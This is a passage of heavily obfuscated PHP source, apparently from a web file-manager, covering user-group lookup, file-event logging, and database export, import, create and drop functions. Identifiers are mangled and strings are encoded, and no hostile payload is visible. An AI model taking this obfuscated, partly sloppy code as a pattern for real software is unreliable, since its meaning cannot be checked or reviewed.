$é™ù©™¯ + 1 <= $“±ûëı) { $“±ûëı = $é™ù©™¯ + 1; } } } return $“±ûëı; } private function userGroupList($¸Äï‘¦ = false) { $ìó¥ø´ı =& $_SERVER[ñ÷§¡å]; static $æ…òµÙÏ = array(); if (isset($æ…òµÙÏ[$¸Äï‘¦])) { return $æ…òµÙÏ[$¸Äï‘¦]; } $Ö÷†À¦ö = Model($ìó¥ø´ı[544])->getInfo($¸Äï‘¦); $æ…òµÙÏ[$¸Äï‘¦] = array_to_keyvalue($Ö÷†À¦ö[$ìó¥ø´ı[2018]], $ìó¥ø´ı[1835]); return $æ…òµÙÏ[$¸Äï‘¦]; } public function userGroupParents($ò³çñšÛ) { $İÜ¼ù‘ =& $_SERVER[ñ÷§¡å]; static $óÕƒãĞ = array(); $ò³çñšÛ = $ò³çñšÛ ? $ò³çñšÛ : USER_ID; if (isset($óÕƒãĞ[$ò³çñšÛ])) { return $óÕƒãĞ[$ò³çñšÛ]; } $ñ˜ÚÒÚï = $this->userGroupList($ò³çñšÛ); $‹ñ€Ù« = array(); $¶ó÷²¢ã = $GLOBALS[$İÜ¼ù‘[6]][$İÜ¼ù‘[99]][$İÜ¼ù‘[1938]] == 1; $×»£´ù… = $¶ó÷²¢ã ? 3 : 2; foreach ($ñ˜ÚÒÚï as $Ú‰öŞ¢) { $ö²´²ß = array($Ú‰öŞ¢[$İÜ¼ù‘[1835]]); $§Áş½è‡ = explode($İÜ¼ù‘[50], trim($Ú‰öŞ¢[$İÜ¼ù‘[530]], $İÜ¼ù‘[50])); if ($§Áş½è‡[0] == $İÜ¼ù‘[207] && count($§Áş½è‡) > $×»£´ù…) { $ç‹ÀûÍ  = array_slice($§Áş½è‡, $×»£´ù…); $ö²´²ß = array_merge($ö²´²ß, array_reverse($ç‹ÀûÍ )); } $‹ñ€Ù« = array_merge($‹ñ€Ù«, $ö²´²ß); } $óÕƒãĞ[$ò³çñšÛ] = array_unique($‹ñ€Ù«); return $óÕƒãĞ[$ò³çñšÛ]; } public function authTargetInfoMake($•ñŒ­é) { $›„ş ï =& $_SERVER[ñ÷§¡å]; $î¦¬Ú·Å = array(); $¹¢‚Õ¿‚ = array(); foreach ($•ñŒ­é as $Ûë·¨’ª) { if ($Ûë·¨’ª[$›„ş ï[420]] == SourceModel::TYPE_USER) { $î¦¬Ú·Å[] = intval($Ûë·¨’ª[$›„ş ï[514]]); } else { if ($Ûë·¨’ª[$›„ş ï[420]] == SourceModel::TYPE_GROUP) { $¹¢‚Õ¿‚[] = intval($Ûë·¨’ª[$›„ş ï[514]]); } } } if ($î¦¬Ú·Å) { $î¦¬Ú·Å = Model($›„ş ï[522])->userListInfo($î¦¬Ú·Å); } if ($¹¢‚Õ¿‚) { $Ö÷Ÿ¢ı = array($›„ş ï[1923] => array($›„ş ï[427], $¹¢‚Õ¿‚)); $¹¢‚Õ¿‚ = Model($›„ş ï[531])->field($›„ş ï[2047])->where($Ö÷Ÿ¢ı)->select(); $¹¢‚Õ¿‚ = array_to_keyvalue($¹¢‚Õ¿‚, $›„ş ï[1835]); } return array($›„ş ï[2048] => $î¦¬Ú·Å, $›„ş ï[2049] => $¹¢‚Õ¿‚); } public function authInfo($Öğ‰ş”ç) { $ÓíŞÔ =& $_SERVER[ñ÷§¡å]; if ($Öğ‰ş”ç[$ÓíŞÔ[1939]]) { $ê¢¸±ò¾ = Model($ÓíŞÔ[516])->listData($Öğ‰ş”ç[$ÓíŞÔ[1939]]); if (!$ê¢¸±ò¾) { return !1; $¨ÆÌ†–Ë = Model($ÓíŞÔ[516])->listData(); $¼‚ç®ã¨ = array_filter_by_field($¨ÆÌ†–Ë, $ÓíŞÔ[422], $ÓíŞÔ[207]); return $¼‚ç®ã¨; } $úéî¨®´ = array_field_key($ê¢¸±ò¾, array($ÓíŞÔ[408], $ÓíŞÔ[32], $ÓíŞÔ[422], $ÓíŞÔ[1858], $ÓíŞÔ[1859])); $úéî¨®´[$ÓíŞÔ[2050]] = $Öğ‰ş”ç; return $úéî¨®´; } else { return array($ÓíŞÔ[428] => 0, $ÓíŞÔ[1841] => $Öğ‰ş”ç[$ÓíŞÔ[1995]], $ÓíŞÔ[429] => $ÓíŞÔ[12], $ÓíŞÔ[1858] => $ÓíŞÔ[2051]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\145\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\x65\162\x74", "\146\165\x6e\143\x74\151\x6f\156"), array("\144\145\163\143", '', "\151\156\163\145\x72\x74\54\x75\160\x64\x61\x74\145\x2c\x73\145\154\x65\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ô–²ê¤, $âĞĞÂÒ, $İ‹Ë¹Âø = '') { $øã§ŸÓ£ =& $_SERVER[ñ÷§¡å]; if (!$this->eventSave) { return; } $®êª‰¢Ê = Model($øã§ŸÓ£[1334])->sourceInfo($ô–²ê¤); if (!$®êª‰¢Ê) { return !1; } if ($this->isCacheEvent($®êª‰¢Ê, $âĞĞÂÒ)) { return; } if ($İ‹Ë¹Âø && is_string($İ‹Ë¹Âø)) { $İ‹Ë¹Âø = array($øã§ŸÓ£[1874] => $İ‹Ë¹Âø); } $’¦£äëÃ = array($øã§ŸÓ£[426] => $ô–²ê¤, $øã§ŸÓ£[2052] => $®êª‰¢Ê[$øã§ŸÓ£[441]], $øã§ŸÓ£[2053] => $®êª‰¢Ê[$øã§ŸÓ£[32]], $øã§ŸÓ£[528] => !empty($®êª‰¢Ê[$øã§ŸÓ£[528]]) ? $®êª‰¢Ê[$øã§ŸÓ£[528]] : $øã§ŸÓ£[12], $øã§ŸÓ£[1654] => USER_ID, $øã§ŸÓ£[431] => $âĞĞÂÒ, $øã§ŸÓ£[1656] => $İ‹Ë¹Âø); $this->addSystemLog($âĞĞÂÒ, $’¦£äëÃ); unset($’¦£äëÃ[$øã§ŸÓ£[2053]], $’¦£äëÃ[$øã§ŸÓ£[528]]); return $this->add($’¦£äëÃ); } private function addSystemLog($¸‘Ñ¼Àó, $» ·›ùú) { $×‡Îú—› =& $_SERVER[ñ÷§¡å]; if ($¸‘Ñ¼Àó == $×‡Îú—›[2054]) { $¸‘Ñ¼Àó = $» ·›ùú[$×‡Îú—›[462]][$×‡Îú—›[2055]]; } else { if (in_array($¸‘Ñ¼Àó, array($×‡Îú—›[1815], $×‡Îú—›[2056]))) { $¸‘Ñ¼Àó = $» ·›ùú[$×‡Îú—›[462]][$×‡Îú—›[768]]; } } $µñø€ä = array_merge($» ·›ùú, array($×‡Îú—›[2057] => $» ·›ùú[$×‡Îú—›[411]], $×‡Îú—›[2058] => $» ·›ùú[$×‡Îú—›[2058]])); Hook::trigger($×‡Îú—›[2059], $×‡Îú—›[2060] . $¸‘Ñ¼Àó, $» ·›ùú); Model($×‡Îú—›[1779])->addLog($×‡Îú—›[2060] . $¸‘Ñ¼Àó, $µñø€ä); } private function isCacheEvent($ß¡Ì‚ï, $ï°Íˆ¤í) { if ($ß¡Ì‚ï[$_SERVER[ñ÷§¡å][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($“¿ıÉ…°, $â˜êÀ›) { $”’éÛò =& $_SERVER[ñ÷§¡å]; $¿¸Àâ­Ì = Model($”’éÛò[1334])->sourceInfo($“¿ıÉ…°); $£ü’Ø½Ì = array($”’éÛò[2055] => $â˜êÀ›, $”’éÛò[32] => $¿¸Àâ­Ì[$”’éÛò[32]]); return $this->addEvent($“¿ıÉ…°, $”’éÛò[2054], $£ü’Ø½Ì); } public function eventFileEdit($¨€Ñ×•—) { $Æœ ê´ =& $_SERVER[ñ÷§¡å]; $ËÚ–ì°ª = array($Æœ ê´[2061] => $_SERVER[$Æœ ê´[2062]], $Æœ ê´[2063] => strtolower(ACTION)); if (isset($GLOBALS[$Æœ ê´[7]][$Æœ ê´[2064]])) { $ËÚ–ì°ª[$Æœ ê´[2064]] = $Æœ ê´[98]; } return $this->addEvent($¨€Ñ×•—, $Æœ ê´[1805], $ËÚ–ì°ª); } public function eventRecycle($£ü¾ïû, $å’Ïççí) { return $this->addEvent($£ü¾ïû, $_SERVER[ñ÷§¡å][2056], $å’Ïççí); } public function eventRemove($ÅúªäÌ‘) { $ºãá¨¨ò =& $_SERVER[ñ÷§¡å]; $ÙÚ‹÷³Š = Model($ºãá¨¨ò[1334])->sourceInfo($ÅúªäÌ‘); $’™Œ÷ßı = $ÙÚ‹÷³Š[$ºãá¨¨ò[32]]; return $this->addEvent($ÙÚ‹÷³Š[$ºãá¨¨ò[441]], $ºãá¨¨ò[1804], $’™Œ÷ßı); } public function eventShare($æ¦ªóçá, $ò¤ÁÑÏ‹) { return $this->addEvent($æ¦ªóçá, $_SERVER[ñ÷§¡å][1815], $ò¤ÁÑÏ‹); } public function eventMove($óşüÍÔí, $úà½¬øÏ, $Ú„¯¼Éó) { $ØÆ²…ş™ =& $_SERVER[ñ÷§¡å]; $øì×ß» = Model($ØÆ²…ş™[1334]); $œ•„ßÏˆ = $øì×ß»->sourceInfo($óşüÍÔí); $Ùò—†ª = $øì×ß»->sourceInfo($úà½¬øÏ); $¹í¹ÑÜ = $øì×ß»->sourceInfo($Ú„¯¼Éó); $ğî®ŸËã = array($ØÆ²…ş™[1167] => $úà½¬øÏ, $ØÆ²…ş™[2065] => $Ùò—†ª[$ØÆ²…ş™[32]], $ØÆ²…ş™[2043] => !empty($Ùò—†ª[$ØÆ²…ş™[528]]) ? $Ùò—†ª[$ØÆ²…ş™[528]] : $ØÆ²…ş™[12], $ØÆ²…ş™[1168] => $Ú„¯¼Éó, $ØÆ²…ş™[2066] => $¹í¹ÑÜ[$ØÆ²…ş™[32]], $ØÆ²…ş™[2067] => !empty($¹í¹ÑÜ[$ØÆ²…ş™[528]]) ? $¹í¹ÑÜ[$ØÆ²…ş™[528]] : $ØÆ²…ş™[12]); $this->addEvent($óşüÍÔí, $ØÆ²…ş™[566], $ğî®ŸËã); $œ•„ßÏˆ = $øì×ß»->sourceInfo($óşüÍÔí); $ğî®ŸËã = array($ØÆ²…ş™[411] => $œ•„ßÏˆ[$ØÆ²…ş™[411]], $ØÆ²…ş™[32] => $œ•„ßÏˆ[$ØÆ²…ş™[32]]); $this->addEvent($úà½¬øÏ, $ØÆ²…ş™[2068], $ğî®ŸËã); } public function eventCopy($‘Ò°â¨é) { $this->eventCreate($‘Ò°â¨é, $_SERVER[ñ÷§¡å][564]); } public function eventRename($×ÖÀàĞ, $É±ô, $¯èÄãƒ) { $‚ÍË‹ÌÅ =& $_SERVER[ñ÷§¡å]; $¡²·†Ü¯ = array($‚ÍË‹ÌÅ[1167] => $É±ô, $‚ÍË‹ÌÅ[1168] => $¯èÄãƒ); return $this->addEvent($×ÖÀàĞ, $‚ÍË‹ÌÅ[1349], $¡²·†Ü¯); } public function eventAddComment($ÇİˆÒøı, $ŠéÛ£õÇ) { return $this->addEvent($ÇİˆÒøı, $_SERVER[ñ÷§¡å][2069], $ŠéÛ£õÇ); } public function eventAddDesc($€ùÅ„¤¨, $Œ¿¨—ş™) { return $this->addEvent($€ùÅ„¤¨, $_SERVER[ñ÷§¡å][2070], $Œ¿¨—ş™); } public function listBySource($¨ ´ßÚ¬) { $‰à‡ŠÜä =& $_SERVER[ñ÷§¡å]; $İ› Ì›Î = Model($‰à‡ŠÜä[1334])->sourceInfo($¨ ´ßÚ¬); $œ² Ì¡í = array($‰à‡ŠÜä[426] => $¨ ´ßÚ¬); if ($İ› Ì›Î[$‰à‡ŠÜä[419]] == $‰à‡ŠÜä[98]) { $óéğ‘ = Model($‰à‡ŠÜä[1334])->listSearchChildren($¨ ´ßÚ¬, 20000); $óéğ‘[] = $¨ ´ßÚ¬ . $‰à‡ŠÜä[387]; $œ² Ì¡í = array($‰à‡ŠÜä[411] => array($‰à‡ŠÜä[7], $óéğ‘)); } $öÍ°âàÆ = $this->where($œ² Ì¡í)->order($‰à‡ŠÜä[2071])->selectPage(); if ($öÍ°âàÆ[$‰à‡ŠÜä[375]][$‰à‡ŠÜä[376]] == 0) { $öÍ°âàÆ[$‰à‡ŠÜä[375]][$‰à‡ŠÜä[376]] = 1; $öÍ°âàÆ[$‰à‡ŠÜä[378]] = array(array($‰à‡ŠÜä[426] => $¨ ´ßÚ¬, $‰à‡ŠÜä[2052] => $İ› Ì›Î[$‰à‡ŠÜä[441]], $‰à‡ŠÜä[1654] => $İ› Ì›Î[$‰à‡ŠÜä[463]], $‰à‡ŠÜä[431] => $‰à‡ŠÜä[2072], $‰à‡ŠÜä[432] => $İ› Ì›Î[$‰à‡ŠÜä[210]], $‰à‡ŠÜä[1656] => $‰à‡ŠÜä[12])); } return $this->eventListParse($öÍ°âàÆ, $¨ ´ßÚ¬); } private function eventListParse($ıîËøÇ, $¡–ŸÒœİ) { $ĞÆÚóÀ¶ =& $_SERVER[ñ÷§¡å]; $•—Æƒ˜ = $ıîËøÇ[$ĞÆÚóÀ¶[378]]; $”Î¸ºº = array_to_keyvalue($•—Æƒ˜, $ĞÆÚóÀ¶[12], $ĞÆÚóÀ¶[411]); $€¢ºÙû© = array_to_keyvalue($•—Æƒ˜, $ĞÆÚóÀ¶[12], $ĞÆÚóÀ¶[2058]); foreach ($•—Æƒ˜ as $¦¬ÖíÂ) { $ğÇ·ÌÁ‘ = $¦¬ÖíÂ[$ĞÆÚóÀ¶[462]]; if ($¦¬ÖíÂ[$ĞÆÚóÀ¶[33]] == $ĞÆÚóÀ¶[566] && isset($ğÇ·ÌÁ‘[$ĞÆÚóÀ¶[1167]])) { $”Î¸ºº[] = $ğÇ·ÌÁ‘[$ĞÆÚóÀ¶[1167]] . $ĞÆÚóÀ¶[12]; $”Î¸ºº[] = $ğÇ·ÌÁ‘[$ĞÆÚóÀ¶[1168]] . $ĞÆÚóÀ¶[12]; } if ($¦¬ÖíÂ[$ĞÆÚóÀ¶[33]] == $ĞÆÚóÀ¶[2068] && isset($ğÇ·ÌÁ‘[$ĞÆÚóÀ¶[411]])) { $”Î¸ºº[] = $ğÇ·ÌÁ‘[$ĞÆÚóÀ¶[411]] . $ĞÆÚóÀ¶[12]; } } $”Î¸ºº = array_merge($”Î¸ºº, $€¢ºÙû©, array($¡–ŸÒœİ . $ĞÆÚóÀ¶[12])); $”Î¸ºº = array_unique($”Î¸ºº); $º¸ïÑç³ = array_unique(array_to_keyvalue($•—Æƒ˜, $ĞÆÚóÀ¶[12], $ĞÆÚóÀ¶[1663])); $ì˜‚Ó­¸ = Model($ĞÆÚóÀ¶[544])->userListInfo($º¸ïÑç³); $ˆ­Ö©†ı = Model($ĞÆÚóÀ¶[838])->sourceListInfo($”Î¸ºº, !0); foreach ($•—Æƒ˜ as &$¦¬ÖíÂ) { if ($¦¬ÖíÂ[$ĞÆÚóÀ¶[33]] == $ĞÆÚóÀ¶[566] && isset($¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[1167]])) { $¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[1167]] = $ˆ­Ö©†ı[$¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[1167]]]; $¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[1168]] = $ˆ­Ö©†ı[$¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[1168]]]; } if ($¦¬ÖíÂ[$ĞÆÚóÀ¶[33]] == $ĞÆÚóÀ¶[2068] && isset($¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[411]])) { $¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[411]] = $ˆ­Ö©†ı[$¦¬ÖíÂ[$ĞÆÚóÀ¶[462]][$ĞÆÚóÀ¶[411]]]; } $¦¬ÖíÂ[$ĞÆÚóÀ¶[96]] = $ˆ­Ö©†ı[$¦¬ÖíÂ[$ĞÆÚóÀ¶[411]]]; $¦¬ÖíÂ[$ĞÆÚóÀ¶[2073]] = $ˆ­Ö©†ı[$¦¬ÖíÂ[$ĞÆÚóÀ¶[2058]]]; if ($¦¬ÖíÂ[$ĞÆÚóÀ¶[33]] == $ĞÆÚóÀ¶[1804]) { $¦¬ÖíÂ[$ĞÆÚóÀ¶[2073]] = $¦¬ÖíÂ[$ĞÆÚóÀ¶[96]]; $¦¬ÖíÂ[$ĞÆÚóÀ¶[2058]] = $¦¬ÖíÂ[$ĞÆÚóÀ¶[2073]][$ĞÆÚóÀ¶[411]]; $¦¬ÖíÂ[$ĞÆÚóÀ¶[96]] = !1; $¦¬ÖíÂ[$ĞÆÚóÀ¶[411]] = $ĞÆÚóÀ¶[12]; } $¦¬ÖíÂ[$ĞÆÚóÀ¶[2003]] = $ì˜‚Ó­¸[$¦¬ÖíÂ[$ĞÆÚóÀ¶[1663]]]; } unset($¦¬ÖíÂ); $ıîËøÇ[$ĞÆÚóÀ¶[378]] = $•—Æƒ˜; return $ıîËøÇ; } public function removeBySource($æ±‹õÙ) { $İğ«Û«× = array($_SERVER[ñ÷§¡å][426] => $æ±‹õÙ); $this->where($İğ«Û«×)->remove(); } } goto fÏŞ»¯Ù¶‡; D¢ëŞÅ—£Â: class DbManage { function __construct($º¸ùÎß¼ = array()) { $–±²›« =& $_SERVER[ñ÷§¡å]; if (empty($º¸ùÎß¼)) { $º¸ùÎß¼ = $GLOBALS[$–±²›«[6]][$–±²›«[21]]; } $this->database = $º¸ùÎß¼; } public function model($ÄæÑ“¯‘ = '') { return new ModelBase($ÄæÑ“¯‘, $_SERVER[ñ÷§¡å][12], $this->database); } public function db($šâÈääá = false) { $›ü³œ =& $_SERVER[ñ÷§¡å]; $¬ŒàÚş = array_change_key_case($this->database); if ($this->dbType() == $›ü³œ[13] || !$šâÈääá) { return $this->model()->db(); } $›ä ¿† = $¬ŒàÚş[$›ü³œ[979]]; $¬ŒàÚş[$›ü³œ[979]] = $›ü³œ[12]; if ($¬ŒàÚş[$›ü³œ[974]] == $›ü³œ[971]) { $Ğàï¼¹ó = $¬ŒàÚş[$›ü³œ[980]]; $¬ŒàÚş[$›ü³œ[980]] = substr($Ğàï¼¹ó, 0, strrpos($Ğàï¼¹ó, $›ü³œ[1066])); } $this->database = $¬ŒàÚş; $”çÕ¾áù = $this->model()->db(); try { $²ÚÔ‘•ì = $”çÕ¾áù->execute("\x73\150\157\x77\x20\x64\141\164\x61\x62\x61\163\145\163\40\154\151\x6b\145\40\47{$›ä ¿†}\47"); } catch (Exception $Ì–ÊõèÒ) { } if (!$²ÚÔ‘•ì) { $”çÕ¾áù->execute("\143\x72\x65\141\x74\145\40\144\141\164\x61\x62\141\x73\x65\x20\140{$›ä ¿†}\x60"); } $¬ŒàÚş[$›ü³œ[979]] = $›ä ¿†; if ($¬ŒàÚş[$›ü³œ[974]] == $›ü³œ[971]) { $¬ŒàÚş[$›ü³œ[980]] .= $›ü³œ[1066] . $›ä ¿†; } $this->database = $¬ŒàÚş; $”çÕ¾áù->execute("\x75\x73\x65\40\x60{$›ä ¿†}\140"); return $”çÕ¾áù; } public function createTable($Îğ®ˆ³, &$·ÀÇë©) { $º²¾Êü =& $_SERVER[ñ÷§¡å]; if (!IO::exist($Îğ®ˆ³)) { ActionCall($º²¾Êü[1067], !0, 0); show_json(LNG($º²¾Êü[1068]), !1); } $ş­‡·ı× = $this->model()->db(); $ÜÑòÃ³ß = sqlSplit(IO::getContent($Îğ®ˆ³)); foreach ($ÜÑòÃ³ß as $¶¢ÄøÊæ) { $–Øù®‹¨ = stripos($¶¢ÄøÊæ, $º²¾Êü[1069]) === 0; if ($–Øù®‹¨) { $·ÀÇë©->task[$º²¾Êü[799]] += 1; } $ş­‡·ı×->execute($¶¢ÄøÊæ); if ($–Øù®‹¨) { preg_match($º²¾Êü[1070], $¶¢ÄøÊæ, $œ®ÒŞ); $·ÀÇë©->task[$º²¾Êü[1071]] = $œ®ÒŞ[1]; $·ÀÇë©->update(1); } } } public function insertTable($ÛˆÙŠ‹ò, &$·²ÆÊ…Â) { $·ïè³²÷ =& $_SERVER[ñ÷§¡å]; $Î¶®†ªî = $this->model()->db(); $ÀÙä’¦Ã = $ØöçÁ–Ÿ ? array($ØöçÁ–Ÿ) : $Î¶®†ªî->getTables(); foreach ($ÛˆÙŠ‹ò as $Ì»­îÙ) { $ØöçÁ–Ÿ = basename($Ì»­îÙ, $·ïè³²÷[801]); if (!in_array($ØöçÁ–Ÿ, $ÀÙä’¦Ã)) { continue; } $·²ÆÊ…Â->task[$·ïè³²÷[1071]] = $ØöçÁ–Ÿ; if (get_filesize($Ì»­îÙ) == 0) { continue; } $Ãùı¹È¬ = $this->sqlToDb($Ì»­îÙ, $·²ÆÊ…Â); if (!$Ãùı¹È¬) { ActionCall($·ïè³²÷[1067], !0, 0); show_json(LNG($·ïè³²÷[1072]) . "\133{$ØöçÁ–Ÿ}\x5d", !1); } } } public function sqlFromDb($·İ•Æº», $”â£È¾î, &$åßãÄ±É, $ ÓÌ×Œª = '') { if ($åßãÄ±É) { $åßãÄ±É->task[$_SERVER[ñ÷§¡å][1071]] = $·İ•Æº»; } $û—‚‡ËÔ = $this->model($·İ•Æº»); $¸‡Â‚ŸÕ = 0; $çùÁ¤ı = 0; $¡áªÖŒ = 10000; $Ï‚ø±•È = fopen($”â£È¾î, $_SERVER[ñ÷§¡å][1073]); $¬ıíÔªâ = $û—‚‡ËÔ->getPk(); $åÉˆï“Ú = $û—‚‡ËÔ->getDbFields(); $Òì§†ª‡ = $_SERVER[ñ÷§¡å][12]; if ($GLOBALS[$_SERVER[ñ÷§¡å][800]] && in_array($·İ•Æº», array($_SERVER[ñ÷§¡å][1074], $_SERVER[ñ÷§¡å][1075]))) { $Òì§†ª‡ = $·İ•Æº»; } do { $İ¸øåê… = array($¬ıíÔªâ => array($_SERVER[ñ÷§¡å][1021], $çùÁ¤ı)); $×¹”¾Óş = $û—‚‡ËÔ->where($İ¸øåê…)->field($åÉˆï“Ú)->order($¬ıíÔªâ . $_SERVER[ñ÷§¡å][1076])->limit($¡áªÖŒ)->select(); $×¹”¾Óş = !empty($×¹”¾Óş) ? $×¹”¾Óş : array(); if (!($´œİ »ç = count($×¹”¾Óş))) { break; } $²Ó€ê = end($×¹”¾Óş); $çùÁ¤ı = $²Ó€ê[$¬ıíÔªâ]; $÷¢ñ´› = array(); foreach ($×¹”¾Óş as $ÎØ´Ñ²·) { if ($Òì§†ª‡) { if ($·İ•Æº» == $_SERVER[ñ÷§¡å][1074]) { if ($ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][33]] == $_SERVER[ñ÷§¡å][1077]) { $ª»ÊÒ“è = json_decode($ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][383]], !0); if ($ª»ÊÒ“è[$_SERVER[ñ÷§¡å][32]] == $GLOBALS[$_SERVER[ñ÷§¡å][800]] && $ª»ÊÒ“è[$_SERVER[ñ÷§¡å][763]] != 1) { continue; } } } else { if ($ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][33]] == $_SERVER[ñ÷§¡å][1078] && $ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][104]] == $_SERVER[ñ÷§¡å][792]) { continue; } } } if ($ ÓÌ×Œª) { $ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][94]] = "\x7b\151\x6f\72{$ ÓÌ×Œª}\175" . substr($ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][94]], strlen("\x7b\151\157\72{$ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][830]]}\x7d")); $ÎØ´Ñ²·[$_SERVER[ñ÷§¡å][830]] = $ ÓÌ×Œª; } $÷¢ñ´›[] = $_SERVER[ñ÷§¡å][1079] . $this->sqlEncode($ÎØ´Ñ²·) . $_SERVER[ñ÷§¡å][1080]; } $éÇ¸’ŸÑ = "\x49\x4e\x53\x45\122\x54\40\x49\116\x54\117\x20\x60{$·İ•Æº»}\140\40\x28\140" . implode($_SERVER[ñ÷§¡å][1081], $åÉˆï“Ú) . $_SERVER[ñ÷§¡å][1082]; fwrite($Ï‚ø±•È, $éÇ¸’ŸÑ . implode($_SERVER[ñ÷§¡å][1083], $÷¢ñ´›) . $_SERVER[ñ÷§¡å][81] . PHP_EOL); $¸‡Â‚ŸÕ += $´œİ »ç; if ($åßãÄ±É) { $åßãÄ±É->update($´œİ »ç); } } while ($¡áªÖŒ == $´œİ »ç); fclose($Ï‚ø±•È); return $¸‡Â‚ŸÕ; } public function sqlToDb($å³Øİ¿‰, &$ªõƒ²Í‰) { $™ñâ†åÑ =& $_SERVER[ñ÷§¡å]; $Ö»£ÔÎû = $this->model()->db(); $×’Õ»Æá = @fopen($å³Øİ¿‰, $™ñâ†åÑ[1084]); if (!$×’Õ»Æá) { return !1; } $ˆ˜‡ï¾¯ = 0; $ÒªÅ‡©ã = $™ñâ†åÑ[12]; $ßÂñ‰»ë = array(); $÷ç«ò´ = $this->dbType(); $²ÏÑ×× = $÷ç«ò´ == $™ñâ†åÑ[13] ? 500 : 2000; $³Ï¡ß×‹ = basename($å³Øİ¿‰, $™ñâ†åÑ[801]); $É‹„¤é‹ = 0; $Œá¯Š¿í = 4194304 - 104858; $Éê¯¯Ë = 1000000 - 104858; while (!feof($×’Õ»Æá)) { $ÀÄÌø = trim(fgets($×’Õ»Æá)); if (!$ÀÄÌø) { continue; } $¢š‰‡Ñî = $this->sqlDecode($ÀÄÌø, $÷ç«ò´, $³Ï¡ß×‹); if (stripos($¢š‰‡Ñî, $™ñâ†åÑ[364]) === 0) { if (!$ÒªÅ‡©ã) { $ÒªÅ‡©ã = $¢š‰‡Ñî . $™ñâ†åÑ[53]; } continue; } if ($ªõƒ²Í‰) { $ªõƒ²Í‰->task[$™ñâ†åÑ[799]] += 1; } $ˆ˜‡ï¾¯++; $ßÂñ‰»ë[] = rtrim(rtrim(trim($¢š‰‡Ñî), $™ñâ†åÑ[50]), $™ñâ†åÑ[81]); $İÏ® = null; $Ç‹‹Ô†‰ = strlen($¢š‰‡Ñî); $É‹„¤é‹ += $Ç‹‹Ô†‰; if ($É‹„¤é‹ >= ($²ÏÑ×× == 500 ? $Éê¯¯Ë : $Œá¯Š¿í)) { $İÏ® = array_pop($ßÂñ‰»ë); if ($ˆ˜‡ï¾¯ > 1) { $ˆ˜‡ï¾¯--; } } if ($ˆ˜‡ï¾¯ >= $²ÏÑ×× || $İÏ®) { $¢š‰‡Ñî = $ÒªÅ‡©ã . implode($™ñâ†åÑ[50], $ßÂñ‰»ë); if (!$Ö»£ÔÎû->execute($¢š‰‡Ñî)) { return !1; } if ($ªõƒ²Í‰) { $ªõƒ²Í‰->update($ˆ˜‡ï¾¯); } $ßÂñ‰»ë = array(); $ˆ˜‡ï¾¯ = 0; $É‹„¤é‹ = 0; if ($İÏ®) { $ßÂñ‰»ë = array($İÏ®); $ˆ˜‡ï¾¯ = 1; $É‹„¤é‹ = $Ç‹‹Ô†‰; } } } fclose($×’Õ»Æá); if (!empty($ßÂñ‰»ë)) { $¢š‰‡Ñî = $ÒªÅ‡©ã . implode($™ñâ†åÑ[50], $ßÂñ‰»ë); if (!$Ö»£ÔÎû->execute($¢š‰‡Ñî)) { return !1; } if ($ªõƒ²Í‰) { $ªõƒ²Í‰->update($ˆ˜‡ï¾¯); } } return !0; } public function dropTable($·¦ÍÁÁö = null) { $‰ŠãÈâ± = $this->model()->db(); $ÀÒåâ¨ = $·¦ÍÁÁö ? array($·¦ÍÁÁö) : $‰ŠãÈâ±->getTables(); if (!$ÀÒåâ¨) { return; } foreach ($ÀÒåâ¨ as $·¦ÍÁÁö) { if ($·¦ÍÁÁö) { $·¦ÍÁÁö = strtolower($·¦ÍÁÁö); } else { continue; } $‰ŠãÈâ±->execute("\x64\162\x6f\x70\40\x74\141\142\154\145\40\151\x66\40\x65\x78\x69\163\164\163\40\x60{$·¦ÍÁÁö}\140"); } } private function sqlEncode($Ìõ¥¿Óş) { $Ã×Ùß›æ =& $_SERVER[ñ÷§¡å]; $ÏÙ¡–Ø² = array(); foreach ($Ìõ¥¿Óş as $êûËÔÄë) { if (is_array($êûËÔÄë)) { $êûËÔÄë = json_encode_force($êûËÔÄë); } $êûËÔÄë = addslashes($êûËÔÄë); $êûËÔÄë = str_replace(array($Ã×Ùß›æ[1085], $Ã×Ùß›æ[65]), array($Ã×Ùß›æ[1086], $Ã×Ùß›æ[1087]), $êûËÔÄë); $ÏÙ¡–Ø²[] = str_replace($Ã×Ùß›æ[58], $Ã×Ùß›æ[1088], $êûËÔÄë); } return $Ã×Ùß›æ[58] . implode($Ã×Ùß›æ[1089], $ÏÙ¡–Ø²) . $Ã×Ùß›æ[58]; } private function sqlDecode($“€Àõü˜, $ŒÍÁø«Ã, $Ÿ¤€¸Å = '') { $ÍÜãá–Æ =& $_SERVER[ñ÷§¡å]; $“€Àõü˜ = str_replace(array($ÍÜãá–Æ[1086], $ÍÜãá–Æ[1087]), array($ÍÜãá–Æ[1085], $ÍÜãá–Æ[65]), $“€Àõü˜); if ($ŒÍÁø«Ã == $ÍÜãá–Æ[13]) { return $Ÿ¤€¸Å != $ÍÜãá–Æ[1090] ? stripslashes($“€Àõü˜) : $“€Àõü˜; } if ($Ÿ¤€¸Å == $ÍÜãá–Æ[1090]) { $“€Àõü˜ = str_replace($ÍÜãá–Æ[1091], $ÍÜãá–Æ[128], stripslashes($“€Àõü˜)); } return $“€Àõü˜; } public function getSqlFile($ˆÑò½–İ = '') { 